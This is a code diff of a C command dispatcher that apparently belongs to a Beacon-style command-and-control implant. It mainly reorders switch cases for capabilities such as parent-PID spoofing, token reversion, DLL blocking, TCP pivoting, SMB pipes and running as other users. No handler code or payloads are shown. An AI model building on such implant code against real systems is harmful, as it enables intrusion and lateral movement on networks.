@@ -18,6 +18,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 {
 	switch (cmd)
 	{
+		case COMMAND_BLOCKDLLS:
+			BlockDlls(buffer, size);
+			break;
 		case COMMAND_LSOCKET_BIND_LOCALHOST:
 			ChannelLSocketBind(buffer, size, LOCALHOST);
 			break;
@@ -36,6 +39,35 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_SPAWNAS_X64:
 			SpawnAsUser(buffer, size, FALSE);
 			break;
+		case COMMAND_LSOCKET_TCPPIVOT:
+			ChannelLSocketTcpPivot(buffer, size);
+			break;
+
+		case COMMAND_ARGUE_ADD:
+			ArgumentAdd(buffer, size);
+			break;
+		case COMMAND_ARGUE_REMOVE:
+			ArgumentRemove(buffer, size);
+			break;
+		case COMMAND_ARGUE_LIST:
+			ArgumentList();
+			break;
+
+		case COMMAND_TCP_CONNECT:
+			LinkViaTcp(buffer, size);
+			break;
+		case COMMAND_JOB_SPAWN_X86:
+			JobSpawn(buffer, size, TRUE, TRUE);
+			break;
+		case COMMAND_JOB_SPAWN_X64:
+			JobSpawn(buffer, size, FALSE, TRUE);
+			break;
+		case COMMAND_JOB_SPAWN_TOKEN_X86:
+			JobSpawn(buffer, size, TRUE, FALSE);
+			break;
+		case COMMAND_JOB_SPAWN_TOKEN_X64:
+			JobSpawn(buffer, size, FALSE, FALSE);
+			break;
 		case COMMAND_SPAWN_PROC_X64:
 			SpawnSetTo(buffer, size, FALSE);
 			break;
@@ -44,6 +76,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_FILE_DRIVES:
 			FilesystemDrives(buffer, size);
+			break;
+		case COMMAND_PIPE_OPEN_EXPLICIT:
+			ProtocolSmbOpenExplicit(buffer);
 			break;
 		case COMMAND_JOB_REGISTER:
 			JobRegister(buffer, size, FALSE, FALSE);
@@ -54,6 +89,12 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_JOB_REGISTER_MSGMODE:
 			JobRegister(buffer, size, FALSE, TRUE);
 			break;
+		case COMMAND_RUN_UNDER_PID:
+			RunUnderPid(buffer, size);
+			break;
+		case COMMAND_PPID:
+			RunSetParentPid(buffer, size);
+			break;
 		case COMMAND_FILE_MOVE:
 			FilesystemMove(buffer, size);
 			break;
@@ -63,17 +104,36 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_SETENV:
 			putenv(buffer);
 			break;
-		
+		case COMMAND_FILE_MKDIR:
+			FilesystemMkdir(buffer, size);
+			break;
+		case COMMAND_RUNAS:
+			RunAsUser(buffer, size);
+			break;
+		case COMMAND_PWD:
+			FilesystemPwd();
+			break;
 		case COMMAND_JOB_KILL:
 			JobKill(buffer, size);
 			break;
 		case COMMAND_JOBS:
 			JobPrintAll();
 			break;
+		case COMMAND_PAUSE:
+			Pause(buffer, size);
+			break;
+		case COMMAND_LOGINUSER:
+			IdentityLoginUser(buffer, size);
+			break;
 		case COMMAND_FILE_LIST:
 			FilesystemList(buffer, size);
 			break;
-
+		case COMMAND_TOKEN_REV2SELF:
+			BeaconRevertToken();
+			break;
+		case COMMAND_LISTEN:
+			ChannelListen(buffer, size);
+			break;
 		case COMMAND_TOKEN_GETUID:
 			IdentityGetUid();
 			break;
@@ -101,68 +161,8 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_CD:
 			FilesystemCd(buffer, size);
 			break;
-		case COMMAND_FILE_MKDIR:
-			FilesystemMkdir(buffer, size);
-			break;
-		case COMMAND_BLOCKDLLS:
-			BlockDlls(buffer, size);
-			break;
-		case COMMAND_TCP_CONNECT:
-			LinkViaTcp(buffer, size);
-			break;
-		case COMMAND_PIPE_OPEN_EXPLICIT:
-			ProtocolSmbOpenExplicit(buffer);
-			break;
-		case COMMAND_LOGINUSER:
-			IdentityLoginUser(buffer, size);
-			break;
-		case COMMAND_PAUSE:
-			Pause(buffer, size);
-			break;
-		case COMMAND_TOKEN_REV2SELF:
-			BeaconRevertToken();
-			break;
 		case COMMAND_EXECUTE:
 			Execute(buffer, size);
-			break;
-		case COMMAND_ARGUE_ADD:
-			ArgumentAdd(buffer, size);
-			break;
-		case COMMAND_ARGUE_REMOVE:
-			ArgumentRemove(buffer, size);
-			break;
-		case COMMAND_ARGUE_LIST:
-			ArgumentList();
-			break;
-		case COMMAND_PWD:
-			FilesystemPwd();
-			break;
-		case COMMAND_RUNAS:
-			RunAsUser(buffer, size);
-			break;
-		case COMMAND_JOB_SPAWN_X86:
-			JobSpawn(buffer, size, TRUE, TRUE);
-			break;
-		case COMMAND_JOB_SPAWN_X64:
-			JobSpawn(buffer, size, FALSE, TRUE);
-			break;
-		case COMMAND_JOB_SPAWN_TOKEN_X86:
-			JobSpawn(buffer, size, TRUE, FALSE);
-			break;
-		case COMMAND_JOB_SPAWN_TOKEN_X64:
-			JobSpawn(buffer, size, FALSE, FALSE);
-			break;
-		case COMMAND_PPID:
-			RunSetParentPid(buffer, size);
-			break;
-		case COMMAND_RUN_UNDER_PID:
-			RunUnderPid(buffer, size);
-			break;
-		case COMMAND_LISTEN:
-			ChannelListen(buffer, size);
-			break;
-		case COMMAND_LSOCKET_TCPPIVOT:
-			ChannelLSocketTcpPivot(buffer, size);
 			break;
 	}
 }
